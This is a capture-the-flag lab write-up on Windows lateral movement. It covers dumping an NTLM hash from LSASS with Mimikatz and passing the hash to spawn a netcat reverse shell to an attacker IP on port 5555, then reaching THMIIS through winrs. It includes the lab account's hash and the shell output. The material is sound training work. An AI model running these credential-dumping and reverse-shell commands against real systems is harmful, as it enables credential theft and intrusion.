# LAB — Lateral Movement with Mimikatz / Pass the Hash

## Objective

Starting with an administrative account on `THMJMP2`, extract another user's NTLM hash from memory with Mimikatz, then use **Pass-the-Hash** to move laterally to `THMIIS`.

**Attack chain:** Admin access to jump host → extract authentication material (Mimikatz) → Pass-the-Hash → remote WinRM shell on another machine.

| Step | Action |
|---|---|
| 1. Initial access | Log in to `THMJMP2` as `ZA\t2_felicia.dean` (has admin access) |
| 2. Extract credentials | Mimikatz reads logon-session material, finds NTLM hash for `t1_toby.beck` |
| 3. Pass the Hash | Mimikatz creates a process using the hash for outbound NTLM auth; netcat connects back |
| 4. Lateral movement | `winrs` connects to `THMIIS`; the resulting shell runs as `ZA\t1_toby.beck` |

With local admin rights, Mimikatz can dump credentials of currently logged-in users from **LSASS** memory or extract hashes from the local **SAM** database.

## Step 2 — Enable debug privilege

```
mimikatz # privilege::debug
```
This requests the Windows debug privilege (**`SeDebugPrivilege`**) for the Mimikatz process, if the token has it available.

- `privilege::` — the module for managing privileges; `debug` — requests the debug privilege.
- `SeDebugPrivilege` can let a process access processes it would otherwise be restricted from (e.g. **LSASS**), subject to Windows protections.
- Success is reported as `Privilege '20' OK`. An error means the process lacks the required rights.

It does **not** by itself make you administrator/SYSTEM, dump credentials, or guarantee LSASS access — the process must already have the necessary rights.

**Memory trick:** `privilege::debug` = request permission to debug other processes; it doesn't grant higher privileges.

## Step 3 — Dump logged-on credentials

```
mimikatz # sekurlsa::logonPasswords
```
This inspects authentication material from Windows logon sessions. Depending on Windows version, protections, and session state, it may reveal hashes, passwords, or other material across all active sessions.

Locate the target account `t1_toby.beck`:

- `Password: (null)` means Mimikatz did not display a plaintext password — **not** that the account has an empty password.

Save the hash on Kali (this only writes it to a file; it does not crack it):


## Step 4 — Pass the Hash with `sekurlsa::pth`

Standard interactive `runas` needs an interactive desktop session; Mimikatz provides **`sekurlsa::pth`** to inject authentication tokens non-interactively.

Start a listener on Kali:
```
rlwrap -cAr nc -lvnp 5555
```

Run PtH (update username, attacker IP, NT hash; check port):
```
mimikatz # sekurlsa::pth /user:<username> /domain:za.tryhackme.com /ntlm:<ntlm hash> /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```
```
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.24 5555"
```
`sekurlsa::pth` uses the supplied NTLM hash to create a process whose outbound NTLM authentication acts as the specified user. It does **not** recover the plaintext password.

> **Username syntax gotcha:** the domain account needs its tier prefix. Using `toby.beck` instead of `t1_toby.beck` causes remote execution to fail with "the user name or password is incorrect." Correct to `t1_toby.beck` and re-run.

Receive the shell:
```

└─$ rlwrap -cAr nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.150.74.24] from (UNKNOWN) [10.200.74.249] 55708
Microsoft Windows [Version 10.0.14393]

C:\Windows\system32>whoami
za\t2_felicia.dean

C:\Windows\system32>hostname
THMJMP2
```

### Why does `whoami` still show Felicia?

PtH does **not** change the identity of the existing Windows session. The reverse-shell process was launched on `THMJMP2`, so its local identity stays Felicia's. The injected hash provides Toby's authentication material for **network** authentication. `whoami` reports the local security context, not the identity used for every outbound connection. Also, the reverse shell alone is not proof the hash is accepted remotely — the next remote connection demonstrates that.

## Step 5 — Lateral movement to THMIIS via `winrs`

From the network-injected shell, run remote commands against `THMIIS` **without supplying credentials** (Toby's material is loaded in memory):
```
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```
```
C:\Windows\system32>winrs.exe -r:THMIIS.za.tryhackme.com cmd
Microsoft Windows [Version 10.0.17763.1098]

C:\Users\t1_toby.beck>whoami
za\t1_toby.beck

C:\Users\t1_toby.beck>hostname
THMIIS
```
`winrs.exe` is the Windows Remote Shell client; it uses WinRM (**TCP 5985** HTTP / **5986** HTTPS) to request a remote `cmd` on `THMIIS`. The `-r:` option is the remote computer name. The hostname changed to `THMIIS` and the identity is now `za\t1_toby.beck` — lateral movement succeeded.

Navigate to Toby's Desktop on `THMIIS` (`cd Desktop`, `dir`), read the flag file:
```
No_password_needed
```

## Key Distinction — Local Identity vs. Network Identity

| Command / action | What it tells you |
|---|---|
| `whoami` in the original reverse shell | Local identity on `THMJMP2` (Felicia) |
| `hostname` in the original reverse shell | Current host is `THMJMP2` |
| Successful remote `winrs` shell | Remote access to `THMIIS` established |
| `whoami` in the `winrs` shell | Remote identity is `ZA\t1_toby.beck` |
| `hostname` in the `winrs` shell | Current host is `THMIIS` |

**Takeaway:** an NTLM hash can be used for authentication without the plaintext password, and the identity of a local process can differ from the identity used for outbound network authentication. The reverse shell gives a prompt on the first machine; `winrs` opens a prompt on the second, where the identity is Toby.
